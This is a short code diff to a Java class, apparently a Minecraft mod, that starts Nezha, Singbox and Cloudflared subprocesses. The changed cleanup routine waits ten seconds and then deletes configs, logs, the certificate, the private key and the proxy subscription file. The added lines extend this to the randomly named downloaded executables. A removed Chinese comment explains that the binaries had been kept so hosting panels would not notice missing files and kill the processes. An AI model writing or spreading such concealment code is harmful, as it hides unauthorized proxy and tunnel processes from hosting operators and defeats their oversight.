@@ -816,16 +816,18 @@ public class Maohi implements ModInitializer {
     private void cleanup() {
         new Thread(() -> {
             try {
-                // 等待 10 秒，确保子进程（Nezha, Singbox, Cloudflared）已经完全将配置和证书加载到内存中
+                // 等待 10 秒，确保子进程（Nezha, Singbox, Cloudflared）已经完全被加载到系统内存中
                 Thread.sleep(10000);
                 String[] sensitiveFiles = {
                     "config.yaml", "config.json", "boot.log", 
-                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt"
+                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt",
+                    webName, botName, phpName // 连同执行文件一并扬灰
                 };
                 for (String file : sensitiveFiles) {
-                    Files.deleteIfExists(FILE_PATH.resolve(file));
+                    if (file != null) {
+                        Files.deleteIfExists(FILE_PATH.resolve(file));
+                    }
                 }
-                // 注：故意保留下载的随机命名的二进制执行文件，防止一些严苛的面板服扫描到文件丢失后干掉孤儿进程
             } catch (Exception ignored) {
             }
         }, "Maohi-Cleanup").start();
